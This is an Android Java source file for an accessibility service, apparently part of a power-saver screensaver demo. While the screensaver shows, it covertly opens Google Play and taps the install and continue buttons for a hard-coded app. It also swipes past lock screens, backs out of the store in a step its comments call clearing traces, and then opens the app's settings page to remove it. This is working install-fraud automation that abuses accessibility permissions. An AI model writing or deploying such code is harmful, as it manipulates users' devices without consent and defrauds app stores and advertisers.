package com.jackiez.materialdemo.extra.service;

import android.accessibilityservice.AccessibilityService;
import android.annotation.TargetApi;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Message;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import com.luna.powersaver.gp.PowerSaver;

import java.lang.ref.WeakReference;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * @author JackieZhuang
 * @email zsigui@foxmail.com
 * @date 2016/12/26
 */
@TargetApi(Build.VERSION_CODES.JELLY_BEAN)
public class NBAccessibilityService extends AccessibilityService implements PowerSaver.StateChangeCallback {

    private static final String TAG = "acs-test";
    private static final int JUDGE_WORK_INTERVAL = 1000;
    public static final String TEST_PACKAGE_NAME = "com.luna.applocker.gp";
    public static final String TEST_APP_NAME = "Migo Applocker";

    // 该状态表明当前是否正处于完成任务状态
    public static boolean sIsInWork = false;
    // 0 需要检查 1 监听下载中 2 清除痕迹 3 检查是还有权限说明还是可以继续下载了 4 完成任务
    public static int sCurrentWorkState = 0;
    // 接收到的最后一次窗口状态变化的事件
    public AccessibilityEvent finalWindowStateChangeEvent;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "NBAccessibilityService.onServiceConnected!");
        PowerSaver.get().addCallback(this);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        PowerSaver.get().removeCallback(this);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getPackageName() == null)
            return;
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.CHINA);
        Log.w(TAG, "onAccessibilityEvent is called! type = " + event.getEventType()
                + ", action = " + event.getAction() + ", time = " + df.format(new Date(event.getEventTime()))
                + ", text = " + event.getText() + ", package = " + event.getPackageName()
                + ", source.text = " + (event.getSource() != null ? event.getSource().getText() : "null")
                + ", isWork = " + sIsInWork);
        traveselNodeInfo(getRootInActiveWindow(), 0);

//        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
//            finalWindowStateChangeEvent = event;
//        }

        if (sIsInWork) {
            // 先进行18及以上处理，18以下待适配
            if (Build.VERSION.SDK_INT > Build.VERSION_CODES.JELLY_BEAN_MR1) {

                if (GuardConst.SUPER_CLEANER.equals(event.getPackageName().toString())
                        && getRootInActiveWindow() != null) {
                    Log.d(TAG, "当前顶端是锁屏，进行右滑");
                    performGlobalAction(AccessibilityService.GESTURE_SWIPE_RIGHT);
                    return;
                } else if (GuardConst.SYSTEM_UI.equals(event.getPackageName().toString())) {
                    Log.d(TAG, "当前顶端是系统锁，进行上滑");
                    if (getRootInActiveWindow() != null) {
                        getRootInActiveWindow().performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD);
                    }
                    return;
                }

                if (sCurrentWorkState == 2) {
                    // 清除痕迹，所以要判断是否商店并退出
                    Log.d(TAG, "清除痕迹，所以要判断是否商店并退出");
                    if (finalWindowStateChangeEvent != null && GPResId.PACKAGE.equals
                            (finalWindowStateChangeEvent.getPackageName().toString())) {

                        // 处于GP，执行后退
                        Log.d(TAG, "工作页面尚处于GP中，执行退出");
                        performGlobalBack();
                    }
                    return;
                }
                if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    finalWindowStateChangeEvent = event;
                }
                if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                    Log.d(TAG, "状态栏发生变化了！！");
                    if (sCurrentWorkState == 3) {
                        Log.d(TAG, "当前是点击安装之后引起的状态栏变化，判断是否由于下载引起");
                        // 通知栏发生变化了
                        if (DownloadResId.PACKAGE.equals(event.getPackageName().toString())) {
                            // 下载引起的变化，说明是下载中
                            Log.d(TAG, "通知栏变化是由于下载通知引起的，则说明执行下载了，修改状态为监听下载");
                            sCurrentWorkState = 1;
                            // 判断当前上次变化是否处于GP中，是则执行退出
                            if (finalWindowStateChangeEvent != null && finalWindowStateChangeEvent.getPackageName() != null
                                    && GPResId.PACKAGE.equals(finalWindowStateChangeEvent.getPackageName().toString())) {

                                // 处于GP，执行后退
                                Log.d(TAG, "工作页面尚处于GP中，执行退出");
                                performGlobalBack();
                            }
                        }
                    } else if (sCurrentWorkState == 1) {
                        Log.d(TAG, "监测下载中，现在要监测任务是否完成：" + event.getText()
                         + (event.getPackageName()) + ", ");
                        if (event.getText() != null && event.getText().size() > 0 && event.getText().get(0) != null
                                && event.getText().get(0).toString().contains(TEST_APP_NAME)
                                && GPResId.PACKAGE.equals(event.getPackageName().toString())) {
                            // 当前正在安装或者已经安装完成，判断app是否安装
                            Log.d(TAG, "当前正在安装或者已经安装完成，判断app是否安装");
                            if (isPkgInstalled(TEST_PACKAGE_NAME)) {
                                Log.d(TAG, "应用已经安装，修改工作状态");
                                sCurrentWorkState = 4;
                                // 可以进行下一个任务操作，此处直接设置为工作结束
                                sIsInWork = false;
                                mHandler.postDelayed(new Runnable() {
                                    @Override
                                    public void run() {
                                        Log.d(TAG, "跳转应用信息界面，准备删除该应用");
                                        jumpAppDetailSetting(NBAccessibilityService.this, TEST_PACKAGE_NAME);
                                    }
                                }, 5000);
                            }
                        }
                    }
                }
                if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
                        || event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    if (event.getPackageName() != null && GPResId.PACKAGE.equals(event.getPackageName())) {
                        Log.d(TAG, "现在正处于GP中，进行检测操作，sCurrentWorkState = " + sCurrentWorkState);
                        AccessibilityNodeInfo source = getRootInActiveWindow();
                        if (source != null) {
                            List<AccessibilityNodeInfo> nodes;
                            if (sCurrentWorkState == 0) {
                                Log.d(TAG, "判断是否处于应用详情页，然后进行下一步操作");
                                nodes = source.findAccessibilityNodeInfosByViewId(GPResId
                                        .getTitleId());
                                if (nodes != null && nodes.size() > 0 && nodes.get(0) != null) {
                                    Log.d(TAG, "当前处于应用详情页界面，查询处理Title: " + nodes.get(0).getText());
                                    Log.d(TAG, "当前处于应用详情页界面，首先判断是否有接收按钮");
                                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getContinueBarId());
                                    AccessibilityNodeInfo info;
                                    if (nodes != null && nodes.size() > 0) {
                                        Log.d(TAG, "找到继续按钮的界面，查找继续的确认按钮");
                                        nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getContinueBtnId());
                                        if (nodes != null && nodes.size() > 0) {
                                            info = nodes.get(0);
                                            boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                            Log.d(TAG, "找到继续安装按钮，执行安装程序! class = " + info.getClassName() + ", " +
                                                    "isClickable = " + info.isClickable()
                                                    + ", click result = " + result);
                                            if (result) {
                                                // 执行成功，退出GP
                                                sCurrentWorkState = 1;
                                                performGlobalBack();
                                            }
                                        }
                                    } else {
                                        nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getInstallBtnResId());

                                        if (nodes != null && nodes.size() > 0) {
                                            info = nodes.get(0);
                                            boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                            Log.d(TAG, "找到安装按钮，执行安装程序! class = " + info.getClassName() + ", " +
                                                    "isClickable =" +

                                                    " " + info.isClickable()

                                                    + ", click result = " + result);
                                            if (result) {
                                                // 需要监测是否有继续栏了
                                                sCurrentWorkState = 3;
                                                finalWindowStateChangeEvent = event;
                                            }
                                        } else {
                                            Log.d(TAG, "查找不到安装按钮，看是否有卸载按钮！");
//                                    nodes = source.findAccessibilityNodeInfosByViewId(P_GOOGLE_PLAY +
// ":id/uninstall");
//                                    if (nodes != null && nodes.size() > 0) {
//                                        Log.d(TAG, "卸载按钮查找成功，该包已经安装完成，执行退出GP操作");
//                                        performGlobalBack();
//                                    } else {
//                                        Log.d(TAG, "查找不到卸载按钮，默认当前处于安装状态，暂不执行其他操作");
//                                    }
                                        }
                                    }
                                } else {
                                    Log.d(TAG, "当前不处于应用详情页界面，判断是否加载中");
                                    if (!travsalToFindFirstInfoContainsName(source, "ProgressBar")) {
                                        Log.d(TAG, "当前不处于加载中，重新跳转");
//                                        mHandler.postDelayed(new Runnable() {
//                                            @Override
//                                            public void run() {
//                                                if (sIsInWork) {
//                                                    jumpToStore(NBAccessibilityService.this, TEST_PACKAGE_NAME);
//                                                }
//                                            }
//                                        }, 2000);
                                    } else {
                                        Log.d(TAG, "当前在加载中，需要等待！");
                                    }
                                }
                            } else if (sCurrentWorkState == 1) {
                                // 当前正在监听下载
                                Log.d(TAG, "非通知栏事件，监测下载中，现在要监测任务是否完成");
                                if (event.getText() != null && event.getText().size() > 0 && event.getText().get(0) != null
                                        && event.getText().get(0).toString().contains(TEST_APP_NAME)
                                        && GPResId.PACKAGE.equals(event.getPackageName().toString())) {
                                    // 当前正在安装或者已经安装完成，判断app是否安装
                                    Log.d(TAG, "非通知栏事件，当前正在安装或者已经安装完成，判断app是否安装");
                                    if (isPkgInstalled(TEST_PACKAGE_NAME)) {
                                        Log.d(TAG, "非通知栏事件，应用已经安装，修改工作状态");
                                        sCurrentWorkState = 4;
                                        // 可以进行下一个任务操作，此处直接设置为工作结束
                                        sIsInWork = false;
                                        mHandler.postDelayed(new Runnable() {
                                            @Override
                                            public void run() {
                                                Log.d(TAG, "跳转应用信息界面，准备删除该应用");
                                                jumpAppDetailSetting(NBAccessibilityService.this, TEST_PACKAGE_NAME);
                                            }
                                        }, 5000);
                                    }
                                }
                            } else if (sCurrentWorkState == 3) {
                                nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getContinueBarId());
                                Log.d(TAG, "当前处于应用详情页界面，工作状态3，判断是否有继续按钮： " + nodes);
                                AccessibilityNodeInfo info;
                                if (nodes != null && nodes.size() > 0) {
                                    nodes = source.findAccessibilityNodeInfosByViewId(GPResId.getContinueBtnId());
                                    Log.d(TAG, "找到继续按钮的界面，查找继续的确认按钮" + nodes);
                                    if (nodes != null && nodes.size() > 0) {
                                        info = nodes.get(0);
                                        boolean result = info.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                                        Log.d(TAG, "找到继续安装按钮，执行安装程序! class = " + info.getClassName() + ", " +
                                                "isClickable = " + info.isClickable()
                                                + ", click result = " + result);
                                        if (result) {
                                            // 执行成功，退出GP
                                            sCurrentWorkState = 1;
                                            performGlobalBack();
                                        }
                                    }
                                }
                            }

                        }
                    }
                }
            }
        }
    }

    private void jumpAppDetailSetting(Context context, String packgeName) {
        Uri packageURI = Uri.parse("package:" + packgeName);
        Intent intent =  new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,packageURI);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private boolean travsalToFindFirstInfoContainsName(AccessibilityNodeInfo info, String widgetName) {
        if (info == null)
            return false;
        if (info.getChildCount() > 0) {
            for (int i = 0; i < info.getChildCount(); i++) {
                if (travsalToFindFirstInfoContainsName(info.getChild(i), widgetName)) {
                    return true;
                }
            }
        } else if (info.getClassName().toString().contains(widgetName)) {
            return true;
        }
        return false;
    }

    private boolean isPkgInstalled(String pkgName) {
        PackageInfo packageInfo;
        try {
            packageInfo = this.getPackageManager().getPackageInfo(pkgName, 0);
        } catch (PackageManager.NameNotFoundException e) {
            packageInfo = null;
            e.printStackTrace();
        }
        return packageInfo != null;
    }

    private void performGlobalBack() {
        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            }
        }, 400);
    }

    private boolean traveselNodeInfo(AccessibilityNodeInfo info, int depth) {
        StringBuilder spaceCount = new StringBuilder();
        int d = depth;
        while (d-- > 0) {
            spaceCount.append("--");
        }
        if (info != null) {
            Log.d(TAG, spaceCount.toString() + "info.class = " + info.getClassName() + ", getChildCount = " +
                    info.getChildCount()
                    + ", label = " + info.getText() + ", packageName = " + info.getPackageName() + ", isClick = " +
                    info.isClickable() + ", isEnabled = " + info.isEnabled()
                    + ", windowId = " + info.getWindowId());
            if (info.getChildCount() != 0) {
                for (int i = 0; i < info.getChildCount(); i++) {
                    if (traveselNodeInfo(info.getChild(i), depth + 1)) {
                        info.recycle();
                        return true;
                    }
                }
            }
            info.recycle();
//            else if (info.getClassName().toString().equals("android.widget.TextView")
//                    && "setting".equals(info.getText())) {
//                DP.D(DP.TAG_TEST, "find the textview setting! to click! isClick = " + info.isClickable() + ",
// isEnabled = " + info.isEnabled());
//                final AccessibilityNodeInfo s = info.getParent();
//                DP.D(DP.TAG_TEST, "perform click successful or not = " + s.performAction(AccessibilityNodeInfo
// .ACTION_CLICK));
//                s.recycle();
//                info.recycle();
//                return true;
//            }
        } else {
            Log.d(TAG, spaceCount.toString() + "null");
        }
        return false;
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "NBAccessibilityService.onInterrupt!");
    }

    public void toast(String msg) {
        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
    }


    private Handler mHandler = new DownloadHanlder(NBAccessibilityService.this);
    static class DownloadHanlder extends Handler {

        WeakReference<NBAccessibilityService> mReference;

        public DownloadHanlder(NBAccessibilityService service) {
            mReference = new WeakReference<NBAccessibilityService>(service);
        }

        @Override
        public void handleMessage(Message msg) {
            if (mReference == null || mReference.get() == null)
                return;
            final NBAccessibilityService service = mReference.get();
            switch (msg.what) {
                case 0:
                    Log.d(TAG, "接收到网络请求，进行下载事件，此处模拟包名: " + TEST_PACKAGE_NAME);
                    Log.d(TAG, "延迟" + JUDGE_WORK_INTERVAL + "秒执行GP下载操作");
//                    toast("接收到网络请求，进行下载事件，此处模拟包名：" + TEST_PACKAGE_NAME);
                    postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            sendEmptyMessage(1);
                        }
                    }, JUDGE_WORK_INTERVAL);
                    break;
                case 1:
                    Log.d(TAG, "判断当前是否还处于屏保并执行任务");
//                    toast("判断当前是否还处于屏保并执行任务");
                    if (PowerSaver.get().isGuardViewShown()) {
                        Log.d(TAG, "当前处于屏保中，可以执行GP任务了");
                        if (!service.isPkgInstalled(TEST_PACKAGE_NAME)) {
                            Log.d(TAG, "判断该应用未存在，跳转GP安装应用");
                            // 设置状态
                            sIsInWork = true;
                            sCurrentWorkState = 0;
                            // 跳转对应GP位置
                            service.jumpToStore(service.getApplicationContext(), TEST_PACKAGE_NAME);
                            postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);

                                }
                            }, 5000);
                        } else {
                            Log.d(TAG, "该应用已经存在，暂不处理");
                        }
                    }
                    break;
            }
        }
    };

    public boolean jumpToStore(Context context, String packageName) {
        if (context == null)
            return false;
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(GPResId.getWakeAction() + packageName));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.setClassName(GPResId.PACKAGE, GPResId.getMainActivityClassName());
        if (intent.resolveActivity(context.getPackageManager()) != null) {
            context.startActivity(intent);
            return true;
        } else {
            toast("没有可处理的市场类应用");
            return false;
        }
    }

    @Override
    public void onGuardShow() {
        Log.d(TAG, "接收到onGuardShow事件，准备进行判断");
        Log.d(TAG, "判断网络状态并执行网络请求");
//        toast("判断网络状态并执行网络请求");
        // 该线程模拟网络请求
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                mHandler.sendEmptyMessage(0);
            }
        }).start();
    }

    @Override
    public void onGuardHide() {
        Log.d(TAG, "接收到onGuardHide事件，尽量进行扫尾工作");
        sIsInWork = false;
        finalWindowStateChangeEvent = null;
    }
}
